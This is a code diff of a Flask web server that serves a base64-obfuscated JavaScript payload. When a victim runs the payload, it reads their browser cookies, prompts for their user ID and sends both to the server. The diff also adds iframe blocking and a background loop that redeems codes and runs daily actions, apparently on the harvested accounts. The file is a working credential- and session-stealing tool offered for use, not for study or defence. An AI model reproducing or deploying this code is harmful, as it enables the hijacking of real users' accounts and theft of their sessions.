@@ -3,6 +3,7 @@ from waitress import serve
 import threading
 import base64
 import codes
+import daily
 import debug
 import time
 import logs
@@ -20,6 +21,11 @@ def start(*args, **kwargs):
 @app.route("/")
 @debug.debug()
 def home():
+    dest = request.headers.get("Sec-Fetch-Dest")
+    if dest == "empty":
+        return render_template("replit.html")
+    elif dest != "document":
+        return "<h1>1fr4m3s 4r3 n0t 4110w3d.</h1>", 429
     payload = f"""console.log(eval(atob("{base64.b64encode(b'window.location = "http://' + request.headers.get('Host').encode() + b'/sub/"+btoa(btoa(document.cookie)+":"+btoa(prompt("Your UID :")))').decode()}")))"""  #'''
     logs.log_request(request)
     return render_template("home.html", payload=payload)
@@ -70,16 +76,39 @@ def codeend(code, uids):
 
 
 def main():
+    codes_time = 7200
+    daily_time = 43200
     while True:
         try:
+            try:
+                with open("data/last_codes.txt", "r") as f:
+                    n = (time.time() - int(f.read())) < codes_time
+                if n:continue
+            except:pass
             if len(codes.db) > 0:
-                codes.redeem_codes()
+                try:codes.redeem_codes()
+                except:pass
+                try:
+                    with open("data/last_codes.txt", "w") as f:
+                        f.write(str(time.time()))
+                except:pass
+                try:
+                    with open("data/last_daily.txt", "r") as f:
+                        n = (time.time() - int(f.read())) < codes_time
+                    if n:continue
+                except:pass
+                try:daily.daily()
+                except:pass
+                try:
+                    with open("data/last_daily.txt", "w") as f:
+                        f.write(str(time.time()))
+                except:pass
         except KeyboardInterrupt:
             raise sys.exit()
         except Exception as e:
             print("c", e)
             logs.log_exception(e)
-        time.sleep(1200)
+        time.sleep(codes_time)
 
 
 # a = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 8899})
